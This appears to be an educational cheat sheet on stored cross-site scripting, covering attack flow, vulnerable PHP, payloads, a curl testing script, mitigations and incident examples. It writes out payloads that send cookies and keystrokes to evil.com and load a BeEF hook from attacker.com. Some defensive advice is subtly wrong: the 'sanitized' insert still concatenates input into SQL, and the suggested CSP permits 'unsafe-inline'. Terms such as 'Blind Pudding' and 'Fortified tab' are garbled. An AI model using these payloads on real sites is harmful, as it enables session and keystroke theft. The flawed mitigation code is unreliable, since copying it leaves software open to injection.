# XSS (Stored) - Persistent Cross-Site Injection

## 🎯 Stored XSS Overview
Stored XSS is persistent cross-site scripting where malicious JavaScript is permanently stored in application (usually database) and executed when any user views content.

**Impact:** Affects all users who view poisoned content, unlike reflected XSS which affects only specific targets.

## 🔬 How Stored XSS Works

### Attack Flow
1. Attacker submits malicious payload to application
2. Payload stored in database (comments, profiles, posts)
3. Victim opens page → XSS payload retrieved from DB
4. Browser executes JavaScript → attack successful

### Vulnerable Code Pattern
```php
// Guestbook vulnerable to stored XSS
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'];
    $message = $_POST['message'];

    // Direct insertion without sanitization
    $sql = "INSERT INTO guestbook (name, message) VALUES ('$name', '$message')";
    mysqli_query($conn, $sql);
}

// Later displayed unsafely
$result = mysqli_query($conn, "SELECT * FROM guestbook");
while($row = mysqli_fetch_assoc($result)) {
    echo "<div><b>{$row['name']}</b>: {$row['message']}</div>"; // XSS HERE
}
```

## 🏗️ Storage Locations

### Common Storage Points
- **User profiles** (bio, name, about)
- **Comments sections** (blogs, forums)
- **Contact forms** (messages stored)
- **Search queries** (saved searches)
- **File metadata** (upload descriptions)
- **User-generated content** (posts, stories)

### Database-Persistent Attacks
```sql
-- XSS payloads stored in various tables
INSERT INTO comments (author, content) VALUES (
    'admin',
    '<script src="//evil.com/xss.js"></script>'
);

INSERT INTO profiles (user_id, bio) VALUES (
    123,
    '<img src=x onerror=document.location="evil.com?c="+document.cookie>'
);
```

## 📊 Attack Techniques

### Classic Payloads
```html
<!-- Cookie theft -->
<script>document.location='http://evil.com?c='+document.cookie</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('http://evil.com/log?' + btoa(e.key));
};
</script>

<!-- Defacement -->
<script>
document.body.innerHTML = '<h1>Hacked by Attacker</h1><img src="evil.gif">';
</script>
```

### Advanced Exploitation
```html
<!-- Iframe with CSRF -->
<iframe src="http://victim.com/change_password?new=evil_pass"
        onload="this.style.display='none'">
</iframe>

<!-- BeEF hook injection -->
<script src="http://attacker.com/beef/hook.js"></script>
```

### Combined Attacks
1. **Stored XSS + CSRF:** Stored XSS executes CSRF to perform actions as victim
2. **Stored XSS + Session Hijacking:** Steal session cookies for session takeover
3. **Stored XSS + Self-Propagation:** XSS payload modifies other DB entries

## 🛠️ Detection & Testing

### Testing Methodology
1. **Input Points:** Find all forms storing user data
2. **Payload Injection:** Submit XSS payload to each field
3. **Payload Recall:** Visit pages displaying stored data
4. **Browser Execution:** Verify JavaScript runs

### Persistent XSS Testing
```bash
# Automated testing script
#!/bin/bash

TARGET="http://vulnerable.com"
PAYLOAD="<img src=x onerror=alert(document.cookie)>"

# Test different input points
curl -X POST -d "name=Test&bio=$PAYLOAD" "$TARGET/profile"
curl -X POST -d "comment=$PAYLOAD" "$TARGET/comments"

# Check if stored
curl "$TARGET/profiles" | grep -q "$PAYLOAD" && echo "Stored XSS Found!"
curl "$TARGET/comments" | grep -q "$PAYLOAD" && echo "Stored XSS Found!"
```

### Burp Suite Testing
1. **Intercept form submission** with injected payload
2. **Submit payload** to application
3. **Browse to stored content pages**
4. **Check Fortified tab** for confirmed XSS

## 🛡️ Prevention & Mitigation

### Input Sanitization (Primary Defense)
```php
// Server-side HTML sanitization
$message = htmlspecialchars($_POST['message'], ENT_QUOTES, 'UTF-8');
$message = strip_tags($message, '<p><b><i>'); // Allow safe tags

// Database storage (sanitized)
mysqli_query($conn, "INSERT INTO posts (content) VALUES ('$message')");
```

### Content Security Policy
```http
Content-Security-Policy: default-src 'self';
                      script-src 'self' 'unsafe-inline';
                      object-src 'none'
```

### Output Encoding
```php
// Always encode before output
while($row = mysqli_fetch_assoc($result)) {
    $safe_content = htmlspecialchars($row['content'], ENT_QUOTES);
    echo "<div class='comment'>$safe_content</div>";
}
```

### Template Engine Defender
```python
# Twig (PHP)
{{ user_content | raw }}     <!-- DANGER -->
{{ user_content | e }}       <!-- SAFE -->

# Jinja2 (Python)
{{ user_content }}          <!-- AUTO ESCAPED -->
{{ user_content | safe }}   <!-- UNSAFE -->
```

### Library-Based Protection
```javascript
// DOMPurify integration
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirty);
element.innerHTML = clean;
```

## 🔍 Real-World Impacts

### 2014: MyBB Forum Stored XSS
- Forum posts contained persistent XSS
- Affected millions of users
- Payloads executed on page load

### 2019: WordPress Core Vulnerability
- Stored XSS in comments
- Could execute admin-level code
- Affected millions of WordPress sites

### 2020: Microsoft Teams Stored XSS
- Chat messages allowed XSS injection
- Executed when other users viewed messages
- Mass propagation possibility

## 📈 Advanced Stored XSS

### Blind Pudding Stored XSS
**Attackers can't directly see results** - rely on others to trigger.
```sql
-- Insert comment with XSS
-- Wait for admin/moderator to view admin panel
-- XSS triggers when admin views flagged content
```

### Mass Exploitation
- **Forum exploitation:** One XSS affects entire communities
- **Social networks:** Status updates affect all followers
- **Review sites:** Product reviews execute for all viewers

### Post-Exploitation
```html
<!-- After gaining initial access -->
<script>
fetch('/logout');  // Logout original user
fetch('/login', {  // Login as admin
    method: 'POST',
    body: new URLSearchParams({
        username: 'admin',
        password: 'known_admin_pass'
    })
});
</script>
```

## 🎯 Testing Checklist

### Systematic Stored XSS Audit
- [ ] Identify all data storage points
- [ ] Test input validation effectiveness  
- [ ] Verify output encoding consistency
- [ ] Check CSP implementation coverage
- [ ] Test sanitization library configuration

### Quality Assurance
- **Regression Testing:** XSS fixes introduce new vulnerabilities
- **Content Matching:** Some inputs are "trusted" (admins) - no sanitization
- **Third-Party Content:** Sanitize external RSS feeds, API responses

---

**Stored XSS = ticking time bomb.** Executed every time content is viewed = massive impact. Prevention requires consistent input/output sanitization across entire application. 💥🔥

Persistent threat requiring thorough sanitization at input AND output boundaries.
